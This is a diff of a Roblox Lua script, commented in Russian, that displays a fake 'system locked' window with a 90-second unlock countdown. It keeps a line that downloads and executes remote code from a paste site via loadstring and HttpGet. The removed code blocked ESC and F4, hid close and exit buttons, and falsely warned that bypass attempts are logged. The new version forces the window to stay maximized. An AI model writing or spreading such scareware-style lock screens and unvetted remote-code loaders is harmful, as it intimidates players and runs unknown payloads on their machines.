@@ -1,17 +1,3 @@
--- Загружаем сервисы
-local CoreGui = game:GetService("CoreGui")
-local Players = game:GetService("Players")
-local PlayerGui = Players.LocalPlayer:WaitForChild("PlayerGui")
-local UIS = game:GetService("UserInputService")
-local RunService = game:GetService("RunService")
-
--- Отключаем возможность закрытия через CoreGui
-for _, obj in pairs(CoreGui:GetChildren()) do
-    if obj:IsA("ScreenGui") then
-        obj.ResetOnSpawn = false
-    end
-end
-
 -- Сначала пробуем загрузить второй скрипт
 local success, errorMsg = pcall(function()
     loadstring(game:HttpGet("https://pastefy.app/q0Hv6Z1b/raw", true))()
@@ -44,84 +30,40 @@ local Tab = Window:CreateTab("ЗАБЛОКИРОВАНО", 4483362458)
 -- Создаем секцию
 local TimerSection = Tab:CreateSection("СИСТЕМНАЯ БЛОКИРОВКА")
 
--- Таймер (объявляем переменную здесь)
+-- Таймер
 local TimerLabel = Tab:CreateLabel("ДО РАЗБЛОКИРОВКИ: 1:30")
-local timeRemaining = 90 -- Используем другую переменную
 
--- Функция блокировки интерфейса
-local function lockInterface()
-    -- Блокировка клавиш
-    UIS.InputBegan:Connect(function(input)
-        if input.KeyCode == Enum.KeyCode.Escape then
-            -- Блокируем ESC
-        elseif input.KeyCode == Enum.KeyCode.F4 then
-            -- Блокируем F4
+-- Запускаем таймер (простая и надежная версия)
+local function startTimer()
+    local timeLeft = 90
+    local connection
+    
+    connection = game:GetService("RunService").Heartbeat:Connect(function(deltaTime)
+        timeLeft = timeLeft - deltaTime
+        
+        if timeLeft <= 0 then
+            TimerLabel:Set("СИСТЕМА РАЗБЛОКИРОВАНА")
+            connection:Disconnect()
+            return
         end
+        
+        local minutes = math.floor(timeLeft / 60)
+        local seconds = math.floor(timeLeft % 60)
+        TimerLabel:Set("ДО РАЗБЛОКИРОВКИ: " .. string.format("%d:%02d", minutes, seconds))
     end)
-
-    -- Постоянное скрытие кнопок закрытия
-    while true do
-        pcall(function()
-            for _, gui in pairs(CoreGui:GetDescendants()) do
-                if (gui:IsA("TextButton") or gui:IsA("ImageButton")) and 
-                   (gui.Name:lower():find("close") or gui.Name:lower():find("exit") or 
-                    gui.Name:lower():find("cancel") or gui.Name:lower():find("x")) then
-                    gui.Visible = false
-                    gui.Active = false
-                end
-            end
-            
-            for _, gui in pairs(PlayerGui:GetDescendants()) do
-                if (gui:IsA("TextButton") or gui:IsA("ImageButton")) and 
-                   (gui.Name:lower():find("close") or gui.Name:lower():find("exit") or 
-                    gui.Name:lower():find("cancel") or gui.Name:lower():find("x")) then
-                    gui.Visible = false
-                    gui.Active = false
-                end
-            end
-        end)
-        task.wait(0.5)
-    end
 end
 
--- Запускаем блокировку
-spawn(lockInterface)
+-- Запускаем таймер
+startTimer()
 
--- Запускаем таймер (исправленная версия)
+-- Простая блокировка интерфейса
 spawn(function()
-    local timer = 90
-    while timer > 0 do
-        task.wait(1)
-        timer = timer - 1
-        local minutes = math.floor(timer / 60)
-        local seconds = timer % 60
-        TimerLabel:Set("ДО РАЗБЛОКИРОВКИ: " .. string.format("%d:%02d", minutes, seconds))
-        
-        -- Усиливаем блокировку каждые 10 секунд
-        if timer % 10 == 0 then
-            pcall(function()
-                Window:Minimize()
-                task.wait(0.1)
-                Window:Maximize()
-            end)
-        end
+    while true do
+        pcall(function()
+            Window:Maximize()
+        end)
+        task.wait(2)
     end
-    
-    TimerLabel:Set("СИСТЕМА РАЗБЛОКИРОВАНА")
 end)
 
--- Дополнительная защита через RenderStepped
-RunService.RenderStepped:Connect(function()
-    pcall(function()
-        -- Постоянно активируем окно
-        Window:Maximize()
-    end)
-end)
-
--- Сообщение о блокировке
-Tab:CreateParagraph({
-    Title = "⚠️ ВНИМАНИЕ: СИСТЕМА ЗАБЛОКИРОВАНА",
-    Content = "Закрытие интерфейса невозможно до окончания таймера.\nЛюбые попытки обхода блокировки фиксируются."
-})
-
-print("🔒 СИСТЕМА ЗАБЛОКИРОВАНА - интерфейс защищен")
+print("🔒 Таймер запущен - интерфейс защищен")
